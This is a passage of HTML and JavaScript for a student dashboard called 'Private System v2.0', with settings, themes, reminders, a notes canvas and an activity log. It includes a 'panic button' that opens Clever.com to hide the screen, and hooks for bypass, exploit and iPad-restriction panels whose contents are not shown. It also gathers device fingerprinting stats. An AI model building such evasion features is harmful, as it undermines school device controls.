                                <option value="none">None (Dashboard Home)</option>
                                <option value="wifiPanel">School WiFi Info</option>
                                <option value="ipadPanel">School iPad Restrictions</option>
                                <option value="handbookPanel">Student Handbooks</option>
                                <option value="statsPanel">Usage Statistics</option>
                                <option value="mediaPanel">Media Player</option>
                                <option value="calculatorPanel">Calculator</option>
                                <option value="converterPanel">Unit Converter</option>
                                <option value="reminderPanel">Reminders</option>
                            </select>
                        </div>
                        <div class="setting-item">
                            <label for="enableCalendarDisplay">Show Calendar Box:</label>
                            <input type="checkbox" id="enableCalendarDisplay" checked>
                        </div>
                         <div class="setting-item">
                            <label for="enableUpdatesNotifications">Show Updates Box:</label>
                            <input type="checkbox" id="enableUpdatesNotifications" checked>
                        </div>
                        <div class="setting-item">
                            <label for="enableMotivationQuote">Show Motivational Quote:</label>
                            <input type="checkbox" id="enableMotivationQuote" checked>
                        </div>
                        <div class="setting-item">
                            <label for="globalFontSizeScale">Global Font Size Scale:</label>
                            <input type="range" id="globalFontSizeScale" min="0.8" max="1.2" step="0.05" value="1.0">
                            <span id="globalFontSizeScaleValue">100%</span>
                        </div>
                         <div class="setting-item">
                          <label for="mainFontFamily">Main Font Family:</label>
                          <select id="mainFontFamily">
                            <option value="'Segoe UI', sans-serif">Segoe UI (Default)</option>
                            <option value="'Montserrat', sans-serif">Montserrat</option>
                            <option value="'Orbitron', sans-serif">Orbitron (Techy)</option>
                            <option value="'Courier New', monospace">Courier New (Monospace)</option>
                          </select>
                        </div>
                        <div class="setting-item">
                            <label for="buttonBorderRadius">Button/Panel Corner Radius:</label>
                            <input type="range" id="buttonBorderRadius" min="0" max="20" value="8">
                            <span id="buttonBorderRadiusValue">8px</span>
                        </div>
                    </div>

                    <div class="setting-group">
                        <h3>Notifications & Logging</h3>
                        <div class="setting-item">
                            <label for="notificationDisplayDuration">Alert Display Duration:</label>
                            <input type="range" id="notificationDisplayDuration" min="1" max="10" value="3">
                            <span id="notificationDisplayDurationValue">3s</span>
                        </div>
                        <div class="setting-item">
                            <label for="desktopNotifications">Desktop Notifications (Reminders):</label>
                            <input type="checkbox" id="desktopNotifications">
                        </div>
                        <div class="setting-item">
                            <label for="reminderSound">Play Reminder Sound:</label>
                            <input type="checkbox" id="reminderSound" checked>
                        </div>
                         <div class="setting-item">
                            <label for="activityLogRetention">Activity Log Max Entries:</label>
                            <input type="range" id="activityLogRetention" min="20" max="200" step="10" value="100">
                            <span id="activityLogRetentionValue">100 entries</span>
                        </div>
                    </div>

                    <div class="setting-group">
                        <h3>Customization & Styling</h3>
                        <div class="setting-item">
                            <label for="accentColorPicker">Accent Color:</label>
                            <div class="color-picker">
                                <input type="color" id="accentColorPicker" value="#ff914d">
                                <button class="action-button small" onclick="dashboard.resetColorSetting('accentColorPicker')">Reset</button>
                            </div>
                        </div>
                        <div class="setting-item">
                            <label for="mainBgColorPicker">Main BG Start Color:</label>
                            <div class="color-picker">
                                <input type="color" id="mainBgColorPicker" value="#0d0d0d">
                                <button class="action-button small" onclick="dashboard.resetColorSetting('mainBgColorPicker')">Reset</button>
                            </div>
                        </div>
                        <div class="setting-item">
                            <label for="headerBgColorPicker">Header BG Primary Color:</label>
                            <div class="color-picker">
                                <input type="color" id="headerBgColorPicker" value="#ff914d">
                                <button class="action-button small" onclick="dashboard.resetColorSetting('headerBgColorPicker')">Reset</button>
                            </div>
                        </div>
                        <div class="setting-item">
                            <label for="buttonGlowIntensity">Button/Box Glow Intensity:</label>
                            <input type="range" id="buttonGlowIntensity" min="0" max="0.5" step="0.05" value="0.2">
                            <span id="buttonGlowIntensityValue">0.2</span>
                        </div>
                        <div class="setting-item">
                            <label for="scrollbarStyle">Custom Scrollbar Style:</label>
                            <input type="checkbox" id="scrollbarStyle" checked>
                        </div>
                    </div>
                    
                    <div class="setting-group">
                        <h3>Advanced Logging & Data</h3>
                        <div class="setting-item">
                            <label for="enableLogging">Enable Analytics Logging (Webhooks):</label>
                            <input type="checkbox" id="enableLogging" checked>
                        </div>
                        <div class="setting-item">
                            <label for="dataExportBtn">Export All User Data:</label>
                            <button id="dataExportBtn">Export JSON</button>
                        </div>
                        <div class="setting-item">
                            <label for="clearCacheBtn">Clear All Local Data:</label>
                            <button id="clearCacheBtn">Clear Cache</button>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div id="canvasContainer" style="display:none;">
            <h2>🖌️ Notes Canvas</h2>
            <canvas id="notesCanvas" width="800" height="500"></canvas>
            <div id="canvasControls">
                <button id="clearCanvasBtn">Clear Canvas</button>
                <button id="closeCanvasBtn">Close Notes</button>
            </div>
        </div>
    </div>

    <!-- NEW: Activity Log Modal Structure -->
    <div id="activityLogModal" class="log-modal-overlay">
        <div class="log-modal-content">
            <button class="log-modal-close-btn" onclick="dashboard.hideActivityLogModal()">&times;</button>
            <h2>📜 Activity Log</h2>
            <div class="log-modal-body" id="activityLogBody">
                <!-- Log entries will be populated here by JS -->
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
    <script>
        const dashboard = {
            activePanel: null,
            activityLogHistory: JSON.parse(localStorage.getItem('activityLogHistory') || '[]'), // Persistent log

            stats: {
                clicks: parseInt(localStorage.getItem('stats_clicks') || '0'),
                panelsOpened: parseInt(localStorage.getItem('stats_panels_opened') || '0'),
                themeToggles: parseInt(localStorage.getItem('stats_theme_toggles') || '0'),
                remindersSet: parseInt(localStorage.getItem('stats_reminders_set') || '0'),
                canvasSaves: parseInt(localStorage.getItem('stats_canvas_used') || '0'),
                screenshotsTaken: parseInt(localStorage.getItem('stats_screenshots') || '0'),
                mediaLoaded: parseInt(localStorage.getItem('stats_media_loaded') || '0'),
                sessionUptime: '00:00:00',
                timeToLogin: parseInt(localStorage.getItem('stats_timeToLogin') || '0'),
                // New stats that don't need direct event listeners yet
                browserName: "...", osName: "...", screenRes: "...", viewportSize: "...",
                deviceMemory: "...", cpus: "...", onlineStatus: "...", zoomLevel: "100%",
                localStorageItems: 0, sessionStorageItems: 0, userAgent: "...", browserLang: "...",
                devicePixelRatio: "...", pointerType: "...", referrer: "...", historyLength: 0,
                notificationPerm: "..."
            },

            // NEW: Function to log alerts (to both fading UI notification and persistent history)
            logAlert: function(message, isPersistent = true) {
                const now = new Date();
                const timestampFormatted = now.toLocaleTimeString('en-US', { hour12: false }); // 24-hour format
                const fullMessageHTML = `<span class="notification-timestamp">${timestampFormatted}</span> ${message}`;

                // Add to fading notification UI
                const container = document.getElementById('notificationContainer');
                const notification = document.createElement('div');
                notification.classList.add('dashboard-notification');
                notification.innerHTML = fullMessageHTML;
                
                const closeBtn = document.createElement('button');
                closeBtn.classList.add('notification-close-btn');
                closeBtn.innerHTML = '&times;';
                closeBtn.onclick = (event) => {
                  notification.remove();
                  event.stopPropagation();
                };
                notification.appendChild(closeBtn);

                container.prepend(notification);

                // Trigger fade-out animation after display time
                const notificationDuration = parseInt(localStorage.getItem('notificationDisplayDuration') || '3', 10) * 1000;
                setTimeout(() => {
                    notification.classList.add('fade-out');
                    notification.addEventListener('animationend', () => {
                        notification.remove();
                    }, { once: true });
                }, notificationDuration);

                // Add to persistent activity log history (if persistent, most are by default)
                if (isPersistent) {
                    const logEntry = {
                        timestamp: now.toISOString(),
                        message: message
                    };
                    dashboard.activityLogHistory.unshift(logEntry);
                    // Keep log history to configurable max entries
                    const maxEntries = parseInt(localStorage.getItem('activityLogRetention') || '100', 10);
                    while (dashboard.activityLogHistory.length > maxEntries) {
                        dashboard.activityLogHistory.pop();
                    }
                    localStorage.setItem('activityLogHistory', JSON.stringify(dashboard.activityLogHistory));
                }
            },

            // Updates CSS variables for themes and custom colors dynamically
            applyCustomStyles: function() {
                const root = document.documentElement;
                
                // Get general settings from localStorage or defaults
                const uiAnimationSpeed = localStorage.getItem('uiAnimationSpeed') || '0.3';
                const buttonBorderRadius = localStorage.getItem('buttonBorderRadius') || '8';
                const buttonGlowIntensity = localStorage.getItem('buttonGlowIntensity') || '0.2';
                const mainFontFamily = localStorage.getItem('mainFontFamily') || "'Segoe UI', sans-serif";
                const globalFontSizeScale = localStorage.getItem('globalFontSizeScale') || '1.0';

                root.style.setProperty('--ui-animation-speed', uiAnimationSpeed + 's');
                root.style.setProperty('--button-border-radius', buttonBorderRadius + 'px');
                root.style.setProperty('--button-glow-intensity', buttonGlowIntensity);
                root.style.setProperty('--font-family', mainFontFamily);
                root.style.setProperty('--base-font-size', `${parseFloat(globalFontSizeScale) * 16}px`); /* Scale base size */

                if (document.body.classList.contains('light-theme')) {
                    root.style.setProperty('--main-bg-start', '#f0f0f0');
                    root.style.setProperty('--main-bg-end', '#dddddd');
                    root.style.setProperty('--main-text-color', '#333');
                    root.style.setProperty('--box-bg-dark', '#fcfcfc');
                    root.style.setProperty('--item-bg-alt-dark', '#eee');
                    root.style.setProperty('--panel-bg-dark', '#fcfcfc');
                    root.style.setProperty('--heading-color-dark', '#994d00');
                } else {
                    root.style.setProperty('--main-bg-start', '#0d0d0d');
                    root.style.setProperty('--main-bg-end', '#1a1a1a');
                    root.style.setProperty('--main-text-color', '#e0e0e0');
                    root.style.setProperty('--box-bg-dark', '#2a2a2a');
                    root.style.setProperty('--item-bg-alt-dark', '#3b3b3b');
                    root.style.setProperty('--panel-bg-dark', '#2a2a2a');
                    root.style.setProperty('--heading-color-dark', '#ffbf80');
                }
                
                document.body.style.background = `linear-gradient(135deg, var(--main-bg-start), var(--main-bg-end))` + ` !important`;
                document.body.style.backgroundAttachment = `fixed` + ` !important`;

                const accentColor = localStorage.getItem('accentColor') || '#ff914d';
                root.style.setProperty('--accent-color', accentColor);
                const lightHoverColor = this.lightenColor(accentColor, 10);
                const hoverShadowColor = this.lightenColor(accentColor, 10, true);
                root.style.setProperty('--accent-color-light-hover', lightHoverColor);
                root.style.setProperty('--accent-color-hover-shadow', hoverShadowColor);
                
                const headerBgCustom = localStorage.getItem('headerBgColor') || accentColor;
                document.getElementById('dashboardHeader').style.background = `linear-gradient(90deg, ${headerBgCustom}, ${this.lightenColor(headerBgCustom, 30)})`;

                document.getElementById('loginBox').style.borderColor = accentColor;
                document.getElementById('loginBox').style.boxShadow = `0 0 25px ${hoverShadowColor}`;
            
                // Unified button styles - apply accents to borders, colors, and shadows
                document.querySelectorAll('.login-box button, .action-button, .quickbar-container button, .button-grid-container .box button, .button-grid-container .box a, .handbook-buttons a, .links-list a, .exploit-buttons a, .bypass-buttons button, .reminder-item button').forEach(btn => {
                    if (btn.id === 'panicBtn') return; // Don't override panic button's red style
                    btn.style.borderColor = accentColor;
                    btn.style.color = accentColor;
                    btn.style.boxShadow = `0 0 10px rgba(255, 145, 77, ${buttonGlowIntensity})`;
                    btn.style.borderRadius = buttonBorderRadius + 'px';
                });
                document.querySelectorAll('input[type="text"], input[type="password"], input[type="number"], select, textarea').forEach(input => {
                  if(input.closest('.settings-grid') || input.closest('.reminder-form')) {
                    input.style.borderRadius = buttonBorderRadius + 'px';
                  }
                });

                document.querySelectorAll('.info-panel h2').forEach(h2 => h2.style.color = accentColor);
                document.querySelectorAll('.box h2').forEach(h2 => {
                  if (document.body.classList.contains('light-theme')) h2.style.color = 'var(--heading-color-dark)';
                  else h2.style.color = 'var(--heading-color-dark)';
                });
                
                document.querySelectorAll('.box').forEach(box => {
                    box.style.backgroundColor = document.body.classList.contains('light-theme') ? 'var(--box-bg-dark)' : 'var(--box-bg-dark)';
                    box.style.boxShadow = `0 0 18px rgba(255, 145, 77, ${buttonGlowIntensity})`;
                    box.style.borderRadius = buttonBorderRadius + 'px';
                });
                document.querySelectorAll('.info-panel').forEach(panel => {
                    panel.style.backgroundColor = document.body.classList.contains('light-theme') ? 'var(--panel-bg-dark)' : 'var(--panel-bg-dark)';
                    panel.style.boxShadow = `0 0 20px rgba(255, 145, 77, ${buttonGlowIntensity})`;
                    panel.style.borderRadius = buttonBorderRadius + 'px';
                });

                document.querySelectorAll('.dashboard-notification').forEach(notif => {
                  notif.style.borderLeftColor = accentColor;
                });

                // Apply custom scrollbar style
                if (localStorage.getItem('scrollbarStyle') === 'true') {
                    document.body.classList.add('custom-scrollbar');
                } else {
                    document.body.classList.remove('custom-scrollbar');
                }

                // Manage animations based on setting
                if (localStorage.getItem('enableFancyAnimations') === 'false') {
                    document.documentElement.style.setProperty('--ui-animation-speed', '0s');
                }
            },

            // Helper to lighten a hex color and optionally add transparency (retained)
            lightenColor: function(hex, percent, addAlpha = false) {
                let f=parseInt(hex.slice(1),16),t=percent<0?0:255,p=percent<0?percent*-1:percent,R=f>>16,G=(f>>8)&0x00ff,B=f&0x0000ff;
                let newR = Math.round((t-R)*p/100)+R;
                let newG = Math.round((t-G)*p/100)+G;
                let newB = Math.round((t-B)*p/100)+B;
                
                if (addAlpha) {
                    let alpha = 0.5;
                    if (percent > 0) alpha = Math.min(0.8, percent / 100 + 0.3);
                    else alpha = Math.max(0.2, 1 - (percent * -1) / 100);
                    return `rgba(${newR}, ${newG}, ${newB}, ${alpha})`;
                }
                return "#"+(0x1000000 + newR*0x10000 + newG*0x100 + newB).toString(16).slice(1);
            },

            // --- Core Dashboard Initialization (re-verified) ---
            init: function() {
                // Initialize/load stats counters. Only init default in LS if not exists.
                Object.keys(this.stats).forEach(key => {
                    const storedValue = localStorage.getItem(`stats_${key}`);
                    if (storedValue !== null) {
                        if (key === 'sessionUptime') { // Special handling for uptime to parse from seconds
                            let totalSeconds = parseInt(localStorage.getItem('stats_sessionUptimeSeconds') || '0');
                            const hrs = String(Math.floor(totalSeconds / 3600)).padStart(2, '0');
                            const mins = String(Math.floor((totalSeconds % 3600) / 60)).padStart(2, '0');
                            const secs = String(totalSeconds % 60).padStart(2, '0');
                            this.stats.sessionUptime = `${hrs}:${mins}:${secs}`;
                        } else {
                            this.stats[key] = (key === 'timeToLogin') ? parseInt(storedValue) : parseInt(storedValue);
                        }
                    } else if (!key.includes("Name") && key !== "sessionUptime" && key !== "onlineStatus" && key !== "zoomLevel") { // Don't set initial text for dynamic display fields as 0
                        localStorage.setItem(`stats_${key}`, '0');
                    }
                });

                this.initSettings(); // NEW: Must be called early to apply root CSS variables from localStorage
                this.initSessionTimer();
                this.initClock();
                this.generateCalendar();
                this.initThemeToggle(); // Uses settings
                this.initButtons();
                this.initCanvas();
                this.initPanels(); // Initialize ALL panels hidden first
                this.initReminders(); // Re-add Reminders functionality
                this.initSuperAdvancedStatsDisplay(); // Populate advanced stats fields
                this.initMediaPlayer(); // Re-add Media Player functionality
                // NEW: Add back Calculator & Unit Converter
                this.initCalculator();
                this.initUnitConverter();
                
                this.colorizeWifiLevels(); // Color code the wifi panel

                // Call default panel on load, based on settings
                const defaultPanelId = localStorage.getItem('defaultPanelOnLoad');
                if (defaultPanelId && defaultPanelId !== 'none') {
                    // Slight delay to allow UI to fully render before showing panel
                    setTimeout(() => {
                        this.togglePanel(defaultPanelId);
                    }, 500); 
                }

                this.logAlert("Dashboard functionality loaded. Welcome to Private System v2.0!");

                // Attach listener for the Activity Log button
                document.getElementById('activityLogBtn').addEventListener('click', () => {
                    dashboard.showActivityLogModal();
                    dashboard.logAlert("📜 Activity Log opened.");
                });
            },
            
            // --- Session Timer (retained) ---
            initSessionTimer: function() {
              let sessionSeconds = parseInt(localStorage.getItem('stats_sessionUptimeSeconds') || '0'); 
              
              setInterval(() => {
                  sessionSeconds++;
                  const hrs = String(Math.floor(sessionSeconds / 3600)).padStart(2, '0');
                  const mins = String(Math.floor((sessionSeconds % 3600) / 60)).padStart(2, '0');
                  const secs = String(sessionSeconds % 60).padStart(2, '0');
                  const formattedTime = `${hrs}:${mins}:${secs}`;
                  
                  document.getElementById('sessionTime').innerText = `Session Time: ${formattedTime}`;
                  this.stats.sessionUptime = formattedTime;
                  localStorage.setItem('stats_sessionUptimeSeconds', sessionSeconds.toString());
                  this.updateStatsDisplay();
              }, 1000);
            },

            initClock: function() {
                function updateClock() {
                    const now = new Date();
                    document.getElementById('realTimeClock').innerText = now.toLocaleTimeString();
                    document.getElementById('realDate').innerText = now.toLocaleDateString();
                }
                updateClock();
                setInterval(updateClock, 1000);
            },
            
            // --- Calendar (retained, fixed emoji in HTML) ---
            generateCalendar: function() {
                const calendar = document.getElementById('calendar');
                // Ensure calendar visibility from settings
                if (localStorage.getItem('enableCalendarDisplay') === 'false') {
                    calendar.closest('.box').style.display = 'none';
                } else {
                    calendar.closest('.box').style.display = 'flex';
                }
                calendar.innerHTML = '';
                const days = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
                days.forEach(day => {
                    const div = document.createElement('div');
                    div.innerText = day;
                    calendar.appendChild(div);
                });
                const date = new Date(), year = date.getFullYear(), month = date.getMonth();
                const firstDay = new Date(year, month, 1).getDay();
                const lastDate = new Date(year, month + 1, 0).getDate();
                for (let i = 0; i < firstDay; i++) calendar.appendChild(document.createElement('div'));
                for (let i = 1; i <= lastDate; i++) {
                    const cell = document.createElement('div');
                    cell.innerText = i;
                    if (i === date.getDate()) cell.classList.add('today');
                    calendar.appendChild(cell);
                }
            },

            // --- Theme Toggle (retained, adapted to new alert system) ---
            initThemeToggle: function() {
                const themeBtn = document.getElementById('themeToggle');
                themeBtn.addEventListener('click', () => {
                    const isLightTheme = document.body.classList.toggle('light-theme');
                    localStorage.setItem('theme', isLightTheme ? 'light' : 'dark');
                    
                    const themeSelector = document.getElementById('themeSelector');
                    if (themeSelector) themeSelector.value = isLightTheme ? 'light' : 'dark';
                    
                    this.applyCustomStyles();
                    this.logAlert(`🎨 Theme toggled to ${isLightTheme ? 'Light' : 'Dark'}.`);

                    this.stats.themeToggles++;
                    localStorage.setItem('stats_theme_toggles', this.stats.themeToggles.toString());
                    this.updateStatsDisplay();
                });

                const savedTheme = localStorage.getItem('theme');
                if (savedTheme === 'light') {
                    document.body.classList.add('light-theme');
                } else {
                    document.body.classList.remove('light-theme');
                }
            },

            // --- Quickbar & Main Buttons (retained logic, adapted for new alert system) ---
            initButtons: function() {
                document.getElementById('panicBtn').addEventListener('click', () => {
                    window.open('https://clever.com', '_blank');
                    this.logAlert('🚨 Panic button activated! Redirecting to Clever.com...');
                });

                document.getElementById('restartBtn').addEventListener('click', () => {
                    const confirmLogout = localStorage.getItem('confirmLogout') !== 'false';
                    if (confirmLogout && !confirm('Are you sure you want to terminate and restart the system?')) {
                        return; // Abort if user cancels
                    }
                    document.body.innerHTML = `<div style="display:flex; justify-content:center; align-items:center; height:100vh; background:#1a1a1a; color:#ff914d; font-family:'Montserrat', sans-serif; font-size:24px;">System terminated. Refresh page to restart.</div>`;
                    this.logAlert('🔄 System Restart initiated.');
                });

                document.getElementById('fixIssuesBtn').addEventListener('click', () => {
                    this.logAlert('⚙️ Running diagnostics... No critical issues detected at this time.');
                });

                document.getElementById('fullScreenBtn').addEventListener('click', () => {
                    if (!document.fullscreenElement) {
                        document.documentElement.requestFullscreen().catch(err => {
                            this.logAlert(`Error attempting fullscreen: ${err.message}`);
                        });
                        this.logAlert('💻 Fullscreen mode enabled.');
                    } else {
                        document.exitFullscreen();
                        this.logAlert('💻 Fullscreen mode disabled.');
                    }
                });

                let zoomLevel = parseFloat(document.body.style.zoom || 1);
                document.getElementById('zoomInBtn').addEventListener('click', () => {
                    zoomLevel = Math.min(2.0, zoomLevel + 0.1);
                    document.body.style.zoom = zoomLevel;
                    this.logAlert(`➕ Zoom In (${Math.round(zoomLevel * 100)}%)`);
                    this.updateStatsDisplay();
                });
                document.getElementById('zoomOutBtn').addEventListener('click', () => {
                    zoomLevel = Math.max(0.5, zoomLevel - 0.1);
                    document.body.style.zoom = zoomLevel;
                    this.logAlert(`➖ Zoom Out (${Math.round(zoomLevel * 100)}%)`);
                    this.updateStatsDisplay();
                });
                if(document.getElementById('statsZoom')) {
                    document.getElementById('statsZoom').innerText = `${Math.round(zoomLevel * 100)}%`;
                }

                document.getElementById('logoutBtn').addEventListener('click', () => {
                    const confirmLogout = localStorage.getItem('confirmLogout') !== 'false';
                    if (confirmLogout && !confirm('Are you sure you want to log out?')) {
                        return; // Abort if user cancels
                    }
                    localStorage.clear();
                    sessionStorage.clear();
                    location.reload();
                    this.logAlert('👋 User logged out.');
                });

                document.getElementById('settingsBtn').addEventListener('click', () => {
                    this.togglePanel('settingsPanel');
                    this.logAlert('🛠️ Settings panel accessed.');
                });
                
                document.getElementById('screenshotBtn').addEventListener('click', () => {
                    html2canvas(document.body).then(canvas => {
                        const link = document.createElement('a');
                        link.download = `screenshot_${new Date().toISOString().slice(0, 19).replace('T', '_').replace(/:/g, '-')}.png`;
                        link.href = canvas.toDataURL();
                        link.click();
                        this.stats.screenshotsTaken++;
                        localStorage.setItem('stats_screenshots', this.stats.screenshotsTaken.toString());
                        this.updateStatsDisplay();
                        this.logAlert('📸 Screenshot taken!');
                    });
                });
            },

            // --- Notes Canvas (retained logic) ---
            initCanvas: function() {
                const notesBtn = document.getElementById('notesBtn');
                const canvasContainer = document.getElementById('canvasContainer');
                const mainGrid = document.getElementById('mainGrid');
                const panelButtonGrid = document.getElementById('panelButtonGrid');
                const updatesNotifications = document.getElementById('updatesNotifications');

                notesBtn.addEventListener('click', () => {
                    mainGrid.style.display = 'none';
                    panelButtonGrid.style.display = 'none';
                    updatesNotifications.style.display = 'none';
                    canvasContainer.style.display = 'block';
                    this.logAlert('📝 Notes canvas opened.');

                    this.stats.canvasSaves++;
                    localStorage.setItem('stats_canvas_used', this.stats.canvasSaves.toString());
                    this.updateStatsDisplay();
                });

                document.getElementById('closeCanvasBtn').addEventListener('click', () => {
                    canvasContainer.style.display = 'none';
                    mainGrid.style.display = 'flex';
                    panelButtonGrid.style.display = 'grid';
                    updatesNotifications.style.display = 'flex';
                    this.logAlert('📝 Notes canvas closed.');
                });

                const canvas = document.getElementById('notesCanvas');
                const ctx = canvas.getContext('2d');
                
                if (!localStorage.getItem('notesCanvasData')) {
                    ctx.fillStyle = '#fff';
                    ctx.fillRect(0, 0, canvas.width, canvas.height);
                }

                const savedNotes = localStorage.getItem('notesCanvasData');
                if (savedNotes) {
                    const img = new Image();
                    img.onload = () => { ctx.drawImage(img, 0, 0, canvas.width, canvas.height); };
                    img.src = savedNotes;
                } else {
                    ctx.fillStyle = '#fff';
                    ctx.fillRect(0, 0, canvas.width, canvas.height);
                }

                let drawing = false;

                function getPos(evt) {
                    const rect = canvas.getBoundingClientRect();
                    return { x: (evt.clientX || (evt.touches && evt.touches[0].clientX)) - rect.left,
                             y: (evt.clientY || (evt.touches && evt.touches[0].clientY)) - rect.top };
                }

                ['mousedown', 'touchstart'].forEach(evtName => {
                    canvas.addEventListener(evtName, (e) => {
                        drawing = true;
                        const pos = getPos(e);
                        ctx.beginPath();
                        ctx.moveTo(pos.x, pos.y);
                        e.preventDefault();
                    });
                });

                ['mousemove', 'touchmove'].forEach(evtName => {
                    canvas.addEventListener(evtName, (e) => {
                        if (!drawing) return;
                        const pos = getPos(e);
                        ctx.lineTo(pos.x, pos.y);
                        ctx.strokeStyle = localStorage.getItem('accentColor') || '#ff914d';
                        ctx.lineWidth = 3;
                        ctx.lineCap = 'round';
                        ctx.lineJoin = 'round';
                        ctx.stroke();
                        e.preventDefault();
                    });
                });

                ['mouseup', 'mouseleave', 'touchend', 'touchcancel'].forEach(evtName => {
                    canvas.addEventListener(evtName, () => {
                        drawing = false;
                        localStorage.setItem('notesCanvasData', canvas.toDataURL());
                    });
                });

                document.getElementById('clearCanvasBtn').addEventListener('click', () => {
                    ctx.clearRect(0, 0, canvas.width, canvas.height);
                    ctx.fillStyle = '#fff';
                    ctx.fillRect(0, 0, canvas.width, canvas.height);
                    localStorage.removeItem('notesCanvasData');
                    this.logAlert('🎨 Notes canvas cleared.');
                });

                document.getElementById('exportNotesBtn').addEventListener('click', () => {
                    const link = document.createElement('a');
                    link.download = `notes_canvas_${new Date().toISOString().slice(0, 19).replace('T', '_').replace(/:/g, '-')}.png`;
                    link.href = canvas.toDataURL('image/png');
                    link.click();
                    this.logAlert('💾 Notes exported as image.');
                });
                
                document.getElementById('toggleSectionsBtn').addEventListener('click', () => {
                    const mainRowDisplay = mainGrid.style.display;
                    const panelGridDisplay = panelButtonGrid.style.display;

                    const isContentVisible = (mainRowDisplay !== 'none' && mainRowDisplay !== '') ||
                                             (panelGridDisplay !== 'none' && panelGridDisplay !== '');

                    if (!isContentVisible) {
                        mainGrid.style.display = 'flex';
                        panelButtonGrid.style.display = 'grid';
                        updatesNotifications.style.display = 'flex'; 
                        this.logAlert('↔️ Dashboard sections revealed.');
                    } else {
                        mainGrid.style.display = 'none';
                        panelButtonGrid.style.display = 'none';
                        updatesNotifications.style.display = 'none'; 
                        this.logAlert('↔️ Dashboard sections hidden.');
                    }
                    
                    canvasContainer.style.display = 'none'; 
                    if (this.activePanel) {
                        const panelName = this.activePanel.querySelector('h2').innerText.trim();
                        this.activePanel.style.display = 'none';
                        this.logAlert(`Panel Closed: ${panelName} (due to section toggle)`);
                        this.activePanel = null;
                    }
                });
            },

            // --- Panel Management (retained) ---
            initPanels: function() {
                document.querySelectorAll('.info-panel').forEach(panel => {
                    panel.style.display = 'none';
                });
                document.querySelectorAll('.ipad-content').forEach(content => {
                    content.style.display = 'none';
                });
                document.querySelectorAll('.bypass-content').forEach(content => {
                    content.style.display = 'none';
                });
            },

            togglePanel: function(panelId) {
                const panel = document.getElementById(panelId);
                const isActive = panel.style.display === 'block';
                const panelTitleElement = panel.querySelector('h2');
                const panelName = panelTitleElement ? panelTitleElement.innerText.trim() : panelId;

                if(this.activePanel && this.activePanel.id !== panelId) {
                    this.activePanel.style.display = 'none';
                    const activePanelTitle = this.activePanel.querySelector('h2').innerText.trim();
                    this.logAlert(`Panel Closed: ${activePanelTitle}.`);
                    this.activePanel = null;
                }

                if (!isActive) {
                    panel.style.display = 'block';
                    this.activePanel = panel;
                    this.logAlert(`Panel Opened: ${panelName}.`);
                    if (document.getElementById('statsPanelsOpened')) {
                        this.stats.panelsOpened++;
                        localStorage.setItem('stats_panels_opened', this.stats.panelsOpened.toString());
                    }
                } else {
                    panel.style.display = 'none';
                    this.activePanel = null;
                    this.logAlert(`Panel Closed: ${panelName}.`);
                }
                this.updateStatsDisplay();
            },

            showIpadContent: function(contentId) {
                document.querySelectorAll('.ipad-content').forEach(content => {
                    content.style.display = 'none';
                });
                const targetElement = document.getElementById('ipad' + contentId.charAt(0).toUpperCase() + contentId.slice(1));
                if (targetElement) {
                    targetElement.style.display = 'block';
                    this.logAlert(`📱 iPad ${contentId} information displayed.`);
                }
            },

            showBypassContent: function(contentId) {
                document.querySelectorAll('.bypass-content').forEach(content => {
                    content.style.display = 'none';
                });
                const targetElement = document.getElementById(contentId + 'Bypass');
                if (targetElement) {
                    targetElement.style.display = 'block';
                    this.logAlert(`🔑 Bypass ${contentId} information displayed.`);
                }
            },

            colorizeWifiLevels: function() {
                document.querySelectorAll('.wifi-entry').forEach(entry => {
                    const levelDiv = entry.children[1];
                    if (levelDiv) {
                        const level = levelDiv.textContent.trim().toLowerCase();
                        levelDiv.classList.remove('wifi-high', 'wifi-medium', 'wifi-low');
                        if (level === 'high') {
                            levelDiv.classList.add('wifi-high');
                        } else if (level === 'medium') {
                            levelDiv.classList.add('wifi-medium');
                        } else if (level === 'low') {
                            levelDiv.classList.add('wifi-low');
                        }
                    }
                });
            },

            // --- Reminders System (retained) ---
            reminders: [],
            initReminders: function() {
                const addReminderBtn = document.getElementById('addReminderBtn');
                const reminderText = document.getElementById('reminderText');
                const reminderDate = document.getElementById('reminderDate');
                const reminderTime = document.getElementById('reminderTime');
                const remindersList = document.getElementById('remindersList');
                const clearAllRemindersBtn = document.getElementById('clearAllRemindersBtn');

                this.loadReminders();
                this.renderReminders();

                addReminderBtn.addEventListener('click', () => {
                    const text = reminderText.value.trim();
                    const date = reminderDate.value;
                    const time = reminderTime.value;

                    if (text && date && time) {
                        const newReminder = {
                            id: Date.now(),
                            text,
                            date,
                            time,
                            timestamp: new Date(`${date}T${time}`).getTime(),
                            completed: false,
                            notified: false
                        };
                        this.reminders.push(newReminder);
                        this.saveReminders();
                        this.renderReminders();
                        reminderText.value = '';
                        reminderDate.value = '';
                        reminderTime.value = '';
                        this.logAlert(`⏰ Reminder "${text}" added for ${date} at ${time}.`);

                        this.stats.remindersSet++;
                        localStorage.setItem('stats_reminders_set', this.stats.remindersSet.toString());
                        this.updateStatsDisplay();
                    } else {
                        this.logAlert('❗️ Please fill all reminder fields before adding.');
                    }
                });

                clearAllRemindersBtn.addEventListener('click', () => {
                    if (confirm('Are you sure you want to delete all reminders?')) {
                        this.reminders = [];
                        this.saveReminders();
                        this.renderReminders();
                        this.logAlert('⏰ All reminders cleared.');
                    }
                });

                setInterval(() => {
                    const currentTime = Date.now();
                    this.reminders.forEach(r => {
                        if (!r.completed && !r.notified && r.timestamp <= currentTime && (currentTime - r.timestamp) < 60000) {
                            this.logAlert(`🔔 REMINDER ALERT: "${r.text}"! This reminder was due at ${r.time} on ${r.date}.`);
                            r.notified = true;
                            this.saveReminders();
                            
                            if (localStorage.getItem('reminderSound') === 'true') {
                                const audio = new Audio('https://www.soundjay.com/buttons/button-2.mp3');
                                audio.play().catch(e => console.warn("Reminder sound play failed:", e));
                            }
                            if (Notification.permission === "granted" && localStorage.getItem('desktopNotifications') === 'true') {
                                new Notification("Private System Reminder", {
                                    body: r.text,
                                    icon: 'https://cdn-icons-png.flaticon.com/512/2907/2907159.png'
                                });
                            }
                        }
                    });
                }, 10000);
            },
            saveReminders: function() {
                localStorage.setItem('reminders', JSON.stringify(this.reminders));
            },
            loadReminders: function() {
                const storedReminders = localStorage.getItem('reminders');
                if (storedReminders) {
                    this.reminders = JSON.parse(storedReminders);
                    this.reminders.forEach(r => {
